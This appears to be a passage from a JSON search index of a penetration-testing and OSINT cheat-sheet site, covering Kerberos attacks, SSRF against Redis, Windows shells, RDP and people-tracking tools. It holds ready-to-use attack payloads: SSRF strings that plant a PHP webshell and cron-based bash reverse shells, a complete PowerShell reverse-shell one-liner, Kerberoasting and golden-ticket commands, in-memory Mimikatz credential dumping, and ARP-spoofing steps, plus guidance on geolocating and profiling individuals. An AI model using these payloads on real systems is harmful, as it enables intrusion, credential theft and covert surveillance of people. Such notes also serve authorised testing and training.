	"content": " Company Informations # Find informations about a company https://opencorporates.com # Find multiples sites owned by the same individual/company http://www.spyonweb.com https://www.crunchbase.com https://fr.kompass.com/ https://www.infogreffe.fr/ # Jobs https://www.glassdoor.fr/index.htm # Find people based on several websites https://recruitin.net/ # Cadastre FR https://cadastre.gouv.fr # Call for tender → BOAMP https://www.boamp.fr/ # Legal and Financial informations (might not be free for full informations) https://www.societe.com/ # Brands https://www.inpi.fr/fr # Look for reported vulnerabilities https://www.openbugbounty.org/"
},
{
	"uri": "/web-attacks/content-management-system-cms/",
	"title": "Content Management Systems (CMS)",
	"tags": [],
	"description": "",
	"content": " Table of Content  Server Side Injections Client Side Injections File Inclusions and Injections PHP Vulnerabilities Content Management Systems (CMS) Headers Injections MISC \u0026amp; Others  "
},
{
	"uri": "/open-source-intelligence-osint/technical-recon/frameworks-correlation/datasploit/",
	"title": "Datasploit",
	"tags": [],
	"description": "",
	"content": " General Informations # Performs automated OSINT on a domain / email / username / IP and find out relevant information from different sources. # Easy to contribute OSINT Framework. # Code for Banner, Main and Output function. Datasploit automagically do rest of the things for you. # Useful for Pen-testers, Bug Bounty Hunters, Cyber Investigators, Product companies, Security Engineers, etc. # Collaborate the results, show them in a consolidated manner. # Tries to find out credentials, api-keys, tokens, subdomains, domain history, legacy portals, usernames, dumped accounts, etc. related to the target. # Can be used as library, automated scripts or standalone scripts. # Can generate lists which can be feeded to active scan tools. # Generates HTML, along with text files. # If “module” error in the venv → python -m pip install pip==9.0.3 # API keys needed in the config.py file # shodan_api, censysio_id, censysio_secret, zoomeyeuser, zoomeyepass, clearbit_apikey # emailhunter, fullcontact, google_cse_key, google_cse_cx, github_travis_key. \nUsage # Datasploit allows you to perform OSINT on domain name, email, username or phone number # Script nomemclature → All scripts meant to perform OSINT on domains start with keyword “domain_”. Similair thing for other OSINT types → Scripts with an underscore are standalone scripts and collects data of one specific kind → Scripts without an underscore are the ones used for automated collection of data using standalone scripts. Eg. domainOsint.py # As long as punkspider does not exist anymore, you can disable the module to avoid crash → ENABLED = False in /domain/domain_checkpunkspider.py # Help optional arguments: -h, --help show this help message and exit -i SINGLE_TARGET, --input SINGLE_TARGET Provide Input -f FILE_TARGET, --file FILE_TARGET Provide Input -a, --active Run Active Scan attacks -q, --quiet Run scans in automated manner accepting default answers -o OUTPUT, --output OUTPUT Provide Destination Directory # Usage python datasploit.py -i domain.com -a/-q python domainOsint.py -d example.com python domain_subdomains.py example.com"
},
{
	"uri": "/windows-systems/exploitation/kerberos/",
	"title": "Kerberos",
	"tags": [],
	"description": "",
	"content": " General \u0026amp; Theory # Kerberos is just SSO, it\u0026#39;s like SAML or OpenID. # Authentication to a trusted source (KDC) # KDC delegates access # KDC = Key Distribution Center # AS = Authentication Service # TGT= Ticket Granting Ticket # TGS = Ticket Graning Service # In network, protocol used is KRB5 # TGS are for resources, not hosts # Authentication Process # - Authenticate to AS with a password → Get a TGT # - Request access to resource from TGS → Show TGT # - Valid TGT → Get TGS # - Show TGS to resource → resource accepts TGS → Log in # Each resource can check for valid TGS → Privileged Attribute Certificate (PAC) → Addition to Kerberos # NTLM Authentication # - chall/response using NT hash # - NTLMSSP # Communication with DC over NetLogon (RPC) \nNTLM vs NTLMv1/v2 vs Net-NTLMv1/v2 # NTLMv1/v2 is a shorthand for Net-NTLMv1/v2 and hence are the same thing. # However, NTLM (without v1/v2) means something completely different. # NTLM hashes are stored in the SAM or NTDS database. # It is LMHASH:NTHASH # Net-NTLM hashes are used for network authentication # You CAN perform Pass-The-Hash attacks with NTLM hashes # You CANNOT perform Pass-The-Hash attacks with Net-NTLM hashes \nImpacket # GetTGT # Given a password, hash or aesKey, this script will request a TGT and save it as ccache. getTGT.py -hashes lm:nt domain.com/user# GetST # Given a password, hash, aesKey or TGT in ccache, this script will request a Service Ticket and save it as ccache. # If the account has constrained delegation (with protocol transition) privileges you will be able to use the -impersonate # switch to request the ticket on behalf another user. getST.py -hashes lm:nt -spn cifs/contoso-dc contoso.com/user# GetUserSPNs # This example will try to find and fetch Service Principal Names that are associated with normal user accounts. # Output is compatible with JtR and HashCat. GetUserSPNs.py -dc-ip 192.168.168.10 sittingduck.info/notanadmin# GetNPUsers # This example will attempt to list and get TGTs for those users that have the property # \u0026#39;Do not require Kerberos preauthentication\u0026#39; set (UF_DONT_REQUIRE_PREAUTH). Output is compatible with JtR. # Get TGT for a user → GetNPUsers.py contoso.com/john.doe -no-pass # Get a list of users with UF_DONT_REQUIRE_PREAUTH set → GetNPUsers.py contoso.com/emily:password or GetNPUsers.py contoso.com/emily # Request TGTs for all users → GetNPUsers.py contoso.com/emily:password -request or GetNPUsers.py contoso.com/emily # Request TGTs for users in a file → GetNPUsers.py contoso.com/ -no-pass -usersfile users.txt# ticketer # This script will create Golden/Silver tickets from scratch or based on a template (legally requested from the KDC). ticketer.py -nthash \u0026lt;krbtgt/service nthash\u0026gt; -domain-sid \u0026lt;your domain SID\u0026gt; -domain \u0026lt;your domain FQDN\u0026gt; baduser# raiseChild # This script implements a child-domain to forest privilege escalation by (ab)using the concept of Golden Tickets and ExtraSids. python raiseChild.py childDomain.net/adminuser python raiseChild.py childDomain.net/adminuser:mypwd python raiseChild.py -hashes LMHASH:NTHASH childDomain.net/adminuser # This will perform the attack and then psexec against target-exec as Enterprise Admin python raiseChild.py -target-exec targetHost childDomainn.net/adminuser # This will save the final goldenTicket generated in the ccache target file python raiseChild.py -w ccache childDomain.net/adminuser \nTechnical tips # All the Impacket scripts support Kerberos authentication as well: # -k -no-pass # must specify host as FQDN and user as realm/user # MISC # - NETLOGON is inefficient (SMB, rpcclient) # - RDP is slow # - LDAP binds are faster but still result in event 4625 # Ask for password kinit user # Events ID # - Failing Kerberos pre-authentication DOES NOT trigger a Logon failure event (4625): # - Have to manually specify event logging for Kerberos (which is in a different location) # - If you\u0026#39;re only logging on traditional “Logon failures”, you\u0026#39;d miss this. # - Now failures will be logged as event 4771. # - So Kerberos pre-auth is a faster and potentially stealthier way to bf password. \nNTLM Auth Disabled # Some orgs have fully disabled NTLM and rely solely on Kerberos (it\u0026#39;s rare) # - A lot of pentest tools don\u0026#39;t operate well in these environements # - MSF, CrackMapExec, etc. cause they rely on usernames/passwords or NT hashes # - if you have a password you can always do Kerberos auth, just exchange the password for a TGT, you can also “overpass-the-hash”. # SMB Error “STATUS_NOT_SUPPORTED” = NTLM Auth Not Supported → Kerberos wmiexec.py domain/user@hostname kinit user@domain KRB5CCNAME=/tmp/krb5cc_0 python wmiexec.py \nPassword Bruteforcing # Password bruteforcing # - Care at policy, lockout is mostly at 3 failed attempts. # - Windows security events are logged for every failed login attempts. # - Usually tries SMB and has to set up a connection at every attempt. # - Horizontal bruteforcing is a better approach # - Choose 1 or 2 common passwords, test them for every domain user # Password guessing with Kerberos ! Only 2 frames to check password and it\u0026#39;s UDP no TCP overhead. # https://github.com/ropnop/kerberos_windows_scripts contains scripts to BF password using kinit ! # It\u0026#39;s still lockout account, putting DC as an IP address saves us a DNS lookup each time (even faster). script.sh \u0026lt;domain\u0026gt; \u0026lt;DC\u0026gt; \u0026lt;userlist\u0026gt; PasswordToTest \nService Principal Names (SPN) # Service Principal Names (SPNs) are used in AD to tie services into Kerberos authentication # Common SPN directory: http://adsecurity.org/?page_id=183 # To find SPN you can use LDAP: ldapsearch -LLL -x -H ldap://pdc01.domain.com -D \u0026#34;user@domain\u0026#34; -W -b \u0026#34;dc=lab,dc=ropnop,dc=com\u0026#34; \u0026#34;servicePrincipalName=*\u0026#34; sAMAccountName servicePrincipalName # You can request a TGS for a SPN, e.g. to access RDP, use TGT to request TGS for TERMSRV/PDC01 # The TGS is encrypted with the service accounts NTLM password hash. # It\u0026#39;s possible to crack TGS offline, but cracking a TGS for a service SPN is generally useless UNLESS the SPN is tied to a user account. \nKerberoasting # For service accounts, it\u0026#39;s common to set SPNs to user accounts, the TGS is then encrypted with the user\u0026#39;s NTLM password hash: # - It\u0026#39;s called “Kerberoasting” and presented by Tim Medin at Derbycon 2015. # Kerberoasting requires a valid domain account. # Three step process: # - Find SPN tied to user accounts through LDAP (service accounts) # - Request a TGS for each SPN # - Crack the TGS offline to recover the service account\u0026#39;s password # Impacket makees this easy with GetUserSPNs.py # Will automatically LDAP query then request and TGS in JtR/Hashcat format. GetUserSPNs.py -dc-ip 10.10.10.100 -outputfile kerberos_hashes.txt -request -debug active.htb/SVC_TGS:GPPstillStandingStrong2k18 # You may encounter issue with timezone, you can fix it out that way: • service ntp stop # Comment server line in /etc/ntp.conf timedatectl set-ntp false # Get time of the target: ldapsearch -LLL -x -H ldap://10.10.10.100 -b \u0026#39;\u0026#39; -s base \u0026#39;(objectclass=*)\u0026#39; See this =\u0026gt; currentTime: 20180921143415.0Z (21/09/2018 at 14h34m15s) dpkg-reconfigure tzdata (define None of the above, then GMT) date --set=\u0026#34;Fri 21 Sep 2018 14:35:00\u0026#34; # Verify using several times “date” # Once you get a TGS you can crack it that way using either hashcat or john the ripper from bleeding repo: # You have to be in that folder /home/user/Desktop/Certifs/OSCP/Tools/PasswordCracking/JohnTheRipper/run ./john --wordlist=/home/user/Desktop/Certifs/OSCP/Tools/Wordlist/Bruteforce/rockyou.txt --fork=4 --format=krb5tgs /home/user/Desktop/HackTheBox/VM/Active/kerberos_hashes.txt # Over Pass the Hash (how can you do Kerberos auth without a password ?) # - AS requests to get a TGT, it encrypts the nonce with the NT hash of the password (hash = encryption key) # - So you can request a TGT with only the NT hash # Forging Kerberos Tickets: # - Using Mimikatz or Impacket we can forge TGTs or TGSs # - Golden Ticket # - Forging a TGT (and the included PAC) # - Requires tje krbtgt key, the “master” encryption key from the KDC # - Can be used to request any TGS from the Domain Controller # - Silver Ticket # - Forging a TGS (and included PAC) # - Requires the machine account password (key) from the KDC # - Can be used to directly access any service (without touching DC) ticket.py --aesKey \u0026lt;xxxxxxxx\u0026gt; --domain-sid \u0026lt;S-1-xxxxxxx\u0026gt; --domain \u0026lt;domain\u0026gt; --duration \u0026lt;days\u0026gt; --groups \u0026lt;RIDs\u0026gt; \u0026lt;username\u0026gt; secretsdump.py --just-dc-user krbtgt DOMAIN/user@IPDC # Silver ticket is useful for persistence to a single host/service combo # - Stealthier than Golden Tickets - you never need to actually contact the DC # - It needs the machine accounts Kerberos key, machine accounts usually end in $ # - You must specify the service you need. # Called “over-pass-the-hash”, natively with ktuitl and with Impacket. \nSpeaking Kerberos from Linux # Tool apt-get install heimdal-clients # Setting up # Add Windows AD realm to /etc/krb5.conf # You can figure names out through SRV DNS records [libdefault] default_realm = LAB.ROPNOP.COM [realms] LAB.ROPNOP.COM = { kdc = pdc01.lab.ropnop.com admin_server = pdc01.lab.ropnop.com default_domain = pdc01.lab.ropnop.com } [domain_realm] lab.ropnop.com = LAB.ROPNOP.COM .lab.ropnop.com = LAB.ROPNOP.COM # DNS must be properly configured (/etc/resolv.conf) domain lab.ropnop.com search lab.ropnop.com nameserver 172.16.13.100 # Time must be sync apt-get install rdate rdate -n \u0026lt;DC\u0026gt; # Get a TGT (kinit is used to check out a TGT from the DC) kinit user@REALM # list current tickets (if all is ok, you\u0026#39;ll get a TGT from the DC) klist # Now any tool that supports Kerberos auth can be used with your cache. # GSSAPI = Kerberos =\u0026gt; Auth mechanism that Kerberos 5 uses. # Most tools use environment variable KRB5CCNAME to point to current cache, if not set automatically: # export KRB5CCNAME=/tmp/krb5cc_0 # smbclient smbclient --kerberos //client01.lab.ropnop.com/IPC$ # rpcclient rpcclient -k client01.lab.ropnop.com"
},
{
	"uri": "/windows-systems/post-exploitation-techniques/",
	"title": "Post Exploitation Techniques",
	"tags": [],
	"description": "",
	"content": " Table of Content  Network and Domain Recon  Out of domain (no credentials) Domain Recon Domain Mapping  Local and Physical  Local Recon Enumeration Physical Access  Exploitation  Exploitation Tricks CrackMapExec Impacket Kerberos RDP Exploitation File Transfer  Privilege Escalation  Admin and Processes LSASS and Mimikatz Windows Defender Tricks  Post Exploitation  NTDS Database Silver and Golden Tickets DC Shadow   "
},
{
	"uri": "/web-attacks/server-side-injections/ssrf/",
	"title": "Server Side Request Forgery (SSRF)",
	"tags": [],
	"description": "",
	"content": " https://vinc.top/2016/11/24/server-side-request-forgery \nPoC and enumeration # It is possible to prove the vulnerability by reading local files # Using the file protocol url=file:///etc/passwd # Then you can enumerate local services that are listening # Depending on the response http://localhost:\u0026lt;port\u0026gt; # It is also possible to use others protocols like gopher and dict # They don\u0026#39;t send HTTP headers and can avoid misinterpretation gopher://127.0.0.1:6379/test # Filter bypass http://127.1 instead of http://127.0.0.1 http://0 instead of http://localhost \nRedis Exploitation # Redis is a database system that stores everything in RAM # Getting a webshell url=dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html url=dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php url=dict://127.0.0.1:6379/SET%20mykey%20\u0026#34;\u0026lt;\\x3Fphp system($_GET[0])\\x3F\u0026gt;\u0026#34; url=dict://127.0.0.1:6379/SAVE# Getting a reverse shell gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22 gopher://127.0.0.1:6379/_save nc -lvp \u0026lt;port\u0026gt; http://site.org/reverse.php# Priv. Esc. using SSH key ssh-keygen url=dict://127.0.0.1:6379/SET%20mykey%20\u0026#34;\\n\\nCLE_PUB_RSA_ICI\\n\\n\u0026#34; url=dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/root/.ssh url=dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20authorized_keys url=dict://127.0.0.1:6379/SAVE ssh -i id_rsa root@ctf15.root-me.org # You can use dict protocol and crontab # - You set the working directory # - Update the redis database location # - Listening # - Write a reverse shell payload # - Save it dict ://127.0.0.1:6379/config set dir /var/spool/cron/ dict ://127.0.0.1:6379/config set dbfilename root nc -lvp \u0026lt;port\u0026gt; dict ://127.0.0.1:6379/set -.- \u0026#34;\\n\\n\\n* * * * * bash -i \u0026gt;\\x26 /dev/tcp/\u0026#34;ip\u0026#34;/\u0026#34;port\u0026#34; 0\u0026gt;\\x261\\n\\n\\n\u0026#34; dict ://127.0.0.1:6379/save # You can also use the gopher protocol (replace IP and port) url=gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252462%250D%250A%250A%250A%252A/1%2520%252A%2520%252A%2520%252A%2520%252A%2520bash%2520-i%2520%253E%2526%2520/dev/tcp/xxx.xxx.xxx.xxx/3615%25200%253E%25261%250A%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252416%250D%250A/var/spool/cron/%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25244%250D%250Aroot%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A"
},
{
	"uri": "/shells-methods/",
	"title": "Shells methods",
	"tags": [],
	"description": "",
	"content": " Table of Content  Methodology Fullty Interactive TTY Shell Webshell Reverse Shell Bind Shell Windows Shells Methods  "
},
{
	"uri": "/open-source-intelligence-osint/human-recon/skiptracer/",
	"title": "Skiptracer",
	"tags": [],
	"description": "",
	"content": " Skiptracer # Tool https://github.com/xillwillx/skiptracer/wiki # It uses some basic python webscraping to compile passive information on a target # Included modules will allow queries for the following : # Phone # Email # Screen names # Real names # Addresses # IP # Hostname # Breach Credentials python skiptracer.py -l phone python skiptracer.py -l email python skiptracer.py -l sn python skiptracer.py -l plate- # Phone Number (FR) https://www.118712.fr/"
},
{
	"uri": "/open-source-intelligence-osint/human-recon/social-networks/tinder/",
	"title": "Tinder",
	"tags": [],
	"description": "",
	"content": "# More like Social Engineering # But it\u0026#39;s possible to fake your location # Using the android app → Android Emulator # Using the web app → Fake your brower location # Then you can go on sources (web app) and get pictures to reverse image search # You can also save them using wireshark # https://www.learnallthethings.net/osmosis"
},
{
	"uri": "/web-attacks/php-vulnerabilities/tricks_others/",
	"title": "Tricks &amp; Others",
	"tags": [],
	"description": "",
	"content": " MISC # Path truncation # PHP max path is 4096 char # It is possible to bypass checks for one file, for example, by flooding the path before requesting a resource page=././././././././....... # There is a BIG difference between “$salt” and ‘$salt’. # Double quotes → interpreted as a variable # Simple quotes → interpreted as a string \nRegister Globals index.php ?_SESSION[logged]=1"
},
{
	"uri": "/recon-enumeration/services-enumeration/110_pop3/",
	"title": "110 - POP3",
	"tags": [],
	"description": "",
	"content": " Identification and Scans # Retrieve POP3 server capabilities (CAPA, TOP, USER, SASL, RESP-CODES, LOGIN-DELAY, PIPELINING, EXPIRE, UIDL, IMPLEMENTATION) nmap -v -sV --version-intensity=5 --script pop3-capabilities -p T:110 IP # Try to bruteforce POP3 accounts nmap --script pop3-brute --script-args pop3loginmethod=SASL-LOGIN -p T:110 IP nmap --script pop3-brute --script-args pop3loginmethod=SASL-CRAM-MD5 -p T:110 IP nmap --script pop3-brute --script-args pop3loginmethod=APOP -p T:110 IP \nBanner grabbing/checking # Using netcat nc \u0026lt;IP\u0026gt; 110 # Using telnet telnet \u0026lt;IP\u0026gt; 110 \nAuthentication Checking (classical credentials) USER admin PASS admin USER root PASS root USER root PASS toor # Once logged list"
},
{
	"uri": "/open-source-intelligence-osint/technical-recon/frameworks-correlation/danger_zone/",
	"title": "Danger Zone",
	"tags": [],
	"description": "",
	"content": " General Informations https://github.com/woj-ciech/Danger-zone ⇒ HORRIBLE SETUP #FuckingGoogleSearchApiModule # Correlate data between domains, ips and email addresses, present it as a graph # And store everything into Elasticsearch and JSON files # You have to edit the settings.json file in order to provide your API keys and Elestic database info # Golden Rule → Don\u0026#39;t jump to conclusions too fast \nUsage python danger-zone.py -h usage: dangerzone.py [-h] [--email EMAIL] [--address ADDRESS] [--domain DOMAIN] [--elasticsearch] Correlate data between domains, ips and email addresses and present it as a graph. optional arguments: -h, --help show this help message and exit --email EMAIL Email address --address ADDRESS IP address --domain DOMAIN Domain name --elasticsearch Elasticsearch output # Example domain check python danger-zone.py --domain example.net --elastic \nModules - Email → Trumail - Validation email address (https://trumail.io/) → Whoxy - Reverse Whois service (https://whoxy.com/) KEY NEEDED → haveIbeenPwned - Dumps (https://haveibeenpwned.com/) → Username check - Check username, based on email address, across social media sites (https://username-availability.herokuapp.com/) → Google - Query Google - IP → Geolocation - Geolocate IP (https://extreme-ip-lookup.com/) → Threatcrowd - Information about IP (https://github.com/AlienVault-OTX/ApiV2) → VirusTotal - Information about IP (https://www.virustotal.com/) Key needed - Domain → TLD - Get sponsor of particular Top Level Domain (https://raw.githubusercontent.com/mikewesthad/tld-data/master/data/tlds.json) → Threatcrowd - Information about domain (https://github.com/AlienVault-OTX/ApiV2) → Whoxy - Whois service (https://whoxy.com/) → Whois history - Historical data about domain (https://whoxy.com/) → Wayback Machine - Archive version of website (http://archive.org/) → VirusTotal - Information about domain (https://www.virustotal.com/)"
},
{
	"uri": "/open-source-intelligence-osint/human-recon/geolocation/",
	"title": "Geolocation",
	"tags": [],
	"description": "",
	"content": " Creepy # Creepy is a tool that performs geolocalization through social network inputs # Written in Python, you get a GUI # It uses modules for social networks # You need to first configurate your plugins (using API key for example) # Then you can start a new person project # You choose your plugins, let the soft searches and then add targets to the global search # Once done, you can start searching (often several minutes) # Then you will get locations on the world map for data found # Possible to export results https://www.geocreepy.com/ # virtualenv ? # apt-get remove --purge creepy # apt-get autoremove # pip install -U pytz python-qt flickrapi python-instagram yapsy tweepy google-api-python-client python-dateutil configobj dominate \nKamerka 2.0 (https://github.com/woj-ciech/kamerka) # Build interactive map of cameras, printers, tweets and photos. # The script creates a map of cameras, printers, tweets and photos based on your coordinates. # Everything is clearly presented in form of interactive map with icons and popups. # You can find what interaction on social media have been made in a specific place # All is anonymised for the moment, no username... python kamerka.py --lat 37.235 --lon 115.811111 --dark --twitter --camera --printer \nRealtime Movement (MISC) # Flight Radar in realtime https://www.flightradar24.com # Marine Trafic in realtime https://www.marinetraffic.com/ # Instant StreetView https://www.instantstreetview.com/ # Car embedded cameras tracks https://openstreetcam.org \nPhoto identification # Find photos taken by the same camera using serial number # We don\u0026#39;t know how files are processed/stored.. https://www.stolencamerafinder.com/"
},
{
	"uri": "/web-attacks/headers_injections/",
	"title": "Headers Injections",
	"tags": [],
	"description": "",
	"content": " Security Headers HTTP Strict Transport Security (HSTS) --- Force HTTPS if enabled on the website Content Security Policy (CSP) --- Restrict/Whitelist some resources for some users X-XSS-Protection --- Protection for XSS X-Frame-Options --- Protect from clickjacking by removing iframes X-Content-Type-Options --- Protect from MIME sniffing # Cookie Set-Cookie Secure --- Prevent cookie stealing during transport Set-Cookie HttpOnly --- Prevent cookie stealing in the web browser Set-Cookie SameSite --- Prevent from CSRF (cookies will stay on the website)  \nInteresting Headers Some interesting header to fuzz the application with: Host: 127.0.0.1 X-Forwarded-For: 127.0.0.1 X-Forwarded-Host: 127.0.0.1 X-Forwarded-Server: 127.0.0.1 Location: 127.0.0.1 ProxySourceAddress: 127.0.0.1  \nTRACE/TRACK Method # You can get information using the TRACE method # If your requests goes through a WAF, you might have some informations in the response # Added headers (X-Forwarded-For) for example → You can try to bypass the WAF # Bypass WAF by addind it's own IP in the header and tell him to ignore the request  \nXST - Cross Site Tracing # Client side vulnerability using TRACE Method # It's not about injecting executable Javascript as long as the client must already be able to execute # It takes advantage of the fact that the web server reflect the client's HTTP message in his response # The main goal is to access headers that are blocked by JavaScript  "
},
{
	"uri": "/web-attacks/content-management-system-cms/others/",
	"title": "MISC &amp; Others",
	"tags": [],
	"description": "",
	"content": " CMSimple # CMSimple LFI index.php ?sl=../adm\u0026amp;file=config\u0026amp;action=download\u0026amp;adm=1 \nNanoCMS # Password and sensitive data leak [url]/data/pagesdata.txt"
},
{
	"uri": "/open-source-intelligence-osint/technical-recon/documents_metadata/",
	"title": "Public Documents and Metadata",
	"tags": [],
	"description": "",
	"content": " Metagoofil # Extracting metadata of public documents (pdf,doc,xls,ppt,etc) availables in the target websites # The tool first perform a query in Google requesting different filetypes that can have useful metadata (pdf, doc, xls,ppt,etc) # Then will download those documents to the disk and extracts the metadata of the file using specific libraries for # parsing different file types (Hachoir, Pdfminer, etc) # Options # -d: domain to search # -t: filetype to download (pdf,doc,xls,ppt,odp,ods,docx,xlsx,pptx) # -l: limit of results to search (default 200) # -h: work with documents in directory (use \\\u0026#34;yes\\\u0026#34; for local analysis) # -n: limit of files to download # -o: working directory (location to save downloaded files) # -f: output file metagoofil.py -d domain.com -t doc,pdf -l 10 -n 10 -o /tmp/result -f /tmp/result/result.html \nTruffleHog # Searches through git repositories for secrets, digging deep into commit history and branches. # This is effective at finding secrets accidentally committed. https://github.com/dxa4481/truffleHog truffleHog --regex --entropy=False https://github.com/dxa4481/truffleHog.git truffleHog --json --max_depth 10 https://github.com/dxa4481/truffleHog.git \nJust-Metadata # Collect metadata about IP # You have two main functionnalities divided into modules (gather and analyze) # Load IP file [\u0026gt;] load /path/to/ip.txt # List all the gather modules [\u0026gt;] list gather # You can then user the gather command to collect from any source # Shodan is the only module that requires an API key (Just-Metadata/module/intelgathering/get_shodan.py) [\u0026gt;] gather [\u0026gt;] gather shodan # List all the analysis modules [\u0026gt;] list analysis # Then you can use the analyze command [\u0026gt;] analyze geoinfo # You can get all gathered info about one IP with the following [\u0026gt;] ip_info \u0026lt;ip\u0026gt; # You can save your result to use it later [\u0026gt;] save [\u0026gt;] import /path/to/file.state"
},
{
	"uri": "/windows-systems/exploitation/rdp_exploitation/",
	"title": "RDP Exploitation",
	"tags": [],
	"description": "",
	"content": " Remote and Auto # Remotely enable RDP using CrackMapExec sudo crackmapexec smb 10.69.88.23 -u user -p password -M rdp -o ACTION=enable \ncmd.exe # Enable RDP from cmd.exe reg add \u0026#34;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\u0026#34; /v fDenyTSConnections /t REG_DWORD /d 0 /f # Disable RDP from cmd.exe reg add \u0026#34;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\u0026#34; /v fDenyTSConnections /t REG_DWORD /d 1 /f # Disable NLA (Network Layer Authentication) requirement reg add \u0026#34;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\u0026#34; /v UserAuthentication /t REG_DWORD /d 0 /f # You can also do it through the firewall netsh firewall set service remoteadmin enable netsh firewall set service remotedesktop enable \nPowershell # Requires admin privileges or being able to run as sudo (using powershell sudo.ps1) powershell -ExecutionPolicy ByPass -command \u0026#34;\u0026amp; { . C:\\Users\\Username\\AppData\\Local\\Temp\\sudo_PS1-0.ps1; }\u0026#34; \nMan in The Middle \n# You can try to attack existing RDP connections # seth.sh is a great tool for that # It performs an ARP spoofing attack ./seth.sh eth0 \u0026lt;IP attacker\u0026gt; \u0026lt;IP victim\u0026gt; \u0026lt;Gateway | Host\u0026gt;"
},
{
	"uri": "/open-source-intelligence-osint/human-recon/social-networks/usernames_mails/",
	"title": "Usernames and Emails",
	"tags": [],
	"description": "",
	"content": " Socialscan (https://github.com/iojw/socialscan) # Many tools used to check if an account exists comes with false positive # 100% accuracy: Rather than scanning profile pages, socialscan queries the # registration servers of the platforms directly, retrieving the appropriate # CSRF tokens, headers, and cookies. # This eliminates all false positives/negatives, ensuring that results are accurate. # Speed: socialscan uses asyncio along with aiohttp to conduct all # queries concurrently, resulting in very quick searching even with bulk queries. # Username : Instagram, Twitter, Github, Tumblr, Lastfm, Snapchat, Gitlab, Reddit, Yahoo # Email : Insagram, Twitter, Github, Tumblr, Lastfm, Pinterest, Spotify ./socialscan --help # Only print usernames/emails that are available and not in use ./socialscan \u0026#34;username\u0026#34; --available-only # Only view on Twitter ./socialscan \u0026#34;username\u0026#34; --platforms \u0026#34;Twitter\u0026#34; # General use (all platforms) ./socialscan \u0026#34;username\u0026#34; \u0026#34;email\u0026#34; \nUserRecon https://github.com/thelinuxchoice/userrecon # Find usernames across over 75 social networks. # This is useful if you are running an investigation to determine the usage of # the same username on different social networks. ./userrecon.sh \u0026lt;username\u0026gt; \nSherlock # Look for usernames on 140 sites https://github.com/sherlock-project/sherlock/blob/master/sites.md # Can have some false positives # Classic query, all results will be stored in a \u0026#34;username123.txt\u0026#34; file ./sherlock username123 # Uses TOR network or even a new path for each request # Increases running time and TOR need to be installed and in path ./sherlock username123 --tor ./sherlock username123 --tor-unique # Check only on specified sites ./sherlock username123 --site site1,site2,sit3 \nEmail-enum (https://github.com/Fringitt0/email-enum) # Simple tool that will search for mainstream websites (Instagram, Twitter, Snapchat, Facebook, Google, Twitch) # and thell you if the target e-mail is registered # Usage python3 check.py email@gmail.com"
},
{
	"uri": "/shells-methods/windows/",
	"title": "Windows Shells Methods",
	"tags": [],
	"description": "",
	"content": " Powershell # Powershell reverse shell # Scheduled task for example # powershell -enc \u0026lt;base 64 de la commande\u0026gt; $client = New-Object System.Net.Sockets.TCPClient(\u0026#34;10.0.20.12\u0026#34;,443);$stream = $client.GetStream();\\ [byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;\\ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\\ $sendback = (iex $data 2\u0026gt;\u0026amp;1 | Out-String );$sendback2 = $sendback + \u0026#34;PS \u0026#34; + (pwd).Path + \u0026#34;\u0026gt; \u0026#34;;\\ $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\\ $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() WMIexec # wmiexec is less noisy than psexec /usr/bin/impacket-wmiexec d.traya@192.168.56.102  psexec # psexec # Drosp a binary on the target → Noisy /usr/share/doc/python-impacket/examples/psexec.py GALACTIC/d.traya:triumvirat@192.168.56.102  smbexec # smbexec /usr/share/doc/python-impacket/examples/smbexec.py GALACTIC/d.traya:triumvirat@192.168.56.102  \nMimikatz in RAM # From MSF (execute Mimikatz in RAM) execute -H -i -c -m -d calc.exe -f /path/to/mimikatz.exe -a '\u0026quot;privilege::debug\u0026quot; \u0026quot;sekurlsa::logonPasswords full\u0026quot; exit'  \nMetasploit # psexec msf5 \u0026gt; use exploit/windows/smb/psexec msf5 exploit(windows/smb/psexec) \u0026gt; set RHOSTS 10.69.88.100 msf5 exploit(windows/smb/psexec) \u0026gt; set SMBDomain GALACTIC.LAN msf5 exploit(windows/smb/psexec) \u0026gt; set SMBUSER d.traya msf5 exploit(windows/smb/psexec) \u0026gt; set SMBPASS triumvirat msf5 exploit(windows/smb/psexec) \u0026gt; run # Impersonate user use incognito list_tokens -u impersonate_token \u0026lt;token\u0026gt; shell whoami"
},
{
	"uri": "/windows-systems/",
	"title": "Windows Systems",
	"tags": [],
	"description": "",
	"content": " Table of Content  Network and Domain Recon  Out of domain (no credentials) Domain Recon Domain Mapping  Local and Physical  Local Recon Enumeration Physical Access  Exploitation  Exploitation Tricks CrackMapExec Impacket Kerberos RDP Exploitation File Transfer  Privilege Escalation  Admin and Processes LSASS and Mimikatz Windows Defender Tricks  Post Exploitation  NTDS Database Silver and Golden Tickets DC Shadow   "
},
{
	"uri": "/recon-enumeration/services-enumeration/119_nntp/",
	"title": "119 - NTP",
	"tags": [],
	"description": "",
